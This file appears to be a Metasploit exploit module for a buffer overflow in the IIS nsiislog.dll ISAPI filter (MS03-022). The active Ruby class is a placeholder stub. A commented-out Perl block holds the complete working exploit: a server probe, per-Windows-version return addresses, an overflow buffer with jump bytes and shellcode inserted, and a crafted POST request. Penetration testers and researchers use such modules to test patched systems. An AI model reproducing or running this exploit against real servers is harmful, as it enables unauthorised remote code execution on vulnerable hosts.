require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'IIS nsiislog.dll ISAPI POST Overflow',
			'Description'    => %q{
				This exploits a buffer overflow found in the nsiislog.dll
				ISAPI filter that comes with Windows Media Server. This
				module will also work against the 'patched' MS03-019
				version. This vulnerability was addressed by MS03-022.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '4535'],
					[ 'MSB', 'MS03-022'],
					[ 'URL', 'http://archives.neohapsis.com/archives/vulnwatch/2003-q2/0120.html'],
					[ 'MIL', '30'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x2b\x26\x3d\x25\x0a\x0d\x20",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Jun 25 2003',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::iis_nsiislog_post;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'    => 'IIS nsiislog.dll ISAPI POST Overflow',
	'Version' => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32' ],
	'Priv'  => 0,
	
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'  => 1024,
		'BadChars'  => "\x00+&=%\x0a\x0d\x20",
		'Keys' => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This exploits a buffer overflow found in the nsiislog.dll
        ISAPI filter that comes with Windows Media Server. This
        module will also work against the 'patched' MS03-019
        version. This vulnerability was addressed by MS03-022.
}),

	'Refs'  =>
	  [
		['OSVDB',   '4535'],
		['MSB',     'MS03-022'],
		['URL',     'http://archives.neohapsis.com/archives/vulnwatch/2003-q2/0120.html'],
		['MIL',     '30'],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['Bruteforce', 0, 0],
		['Windows 2000 Pre-MS03-019',   9769, 0x40f01333],
		['Windows 2000 Post-MS03-019', 13869, 0x40f01353],
		['Windows XP Pre-MS03-019',     9773, 0x40f011e0],
	  ],

	'Keys' => ['iis'],

	'DisclosureDate' => 'Jun 25 2003',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("GET /scripts/nsiislog.dll HTTP/1.1\r\nHost: $target_host:$target_port\r\n\r\n");

	my $r = $s->Recv(-1, 5);

	if ($r =~ /NetShow ISAPI/)
	{
		$self->PrintLine("[*] Found /scripts/nsiislog.dll ;)");
		return $self->CheckCode('Detected');
	} else {

		$self->PrintLine("The nsiislog.dll ISAPI does not appear to be installed");
		return $self->CheckCode('Safe');
	}
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   =$self->GetVar('EncodedPayload')->Payload;

	my @targets = @{$self->Targets};
	if ($target_idx == 0)
	{
		shift(@targets);
	} else {
		@targets = ( $targets[$target_idx] );
	}

	foreach my $target (@targets)
	{
		$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

		my $request =
		  "POST /scripts/nsiislog.dll HTTP/1.1\r\n".
		  "Host: $target_host:$target_port\r\n".
		  "User-Agent: NSPlayer/2.0\r\n".
		  "Content-Type: application/x-www-form-urlencoded\r\n";

		my @fields = split(/\s+/, "date time c-dns cs-uri-stem c-starttime ".
			  "x-duration c-rate c-status c-playerid c-playerversion ".
			  "c-playerlanguage cs(User-Agent) cs(Referer) c-hostexe ");
		my $boom;
		foreach my $var (@fields) { $boom .= "$var=BOOM&"; }

		my $pattern = "O" x 65535;

		substr($pattern, $target->[1],  4, pack("V", $target->[2]));
		substr($pattern, $target->[1] - 4, 4, "\xeb\x08\xeb\x08");
		substr($pattern, $target->[1] + 4, length($shellcode), $shellcode);

		$boom .= "c-ip=" . $pattern;
		$request .= "Content-Length: " . length($boom) . "\r\n\r\n" . $boom;

		my $s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
			'LocalPort' => $self->GetVar('CPORT'),
			'SSL'       => $self->GetVar('SSL'),
		  );
		if ($s->IsError) {
			$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
			return;
		}

		$self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
		$s->Send($request);

		$self->PrintLine("[*] Waiting for a response...");
		my $r = $s->Recv(-1, 5);
		sleep(2);
		$s->Close();
	}

	return;
}


=end


end
end	
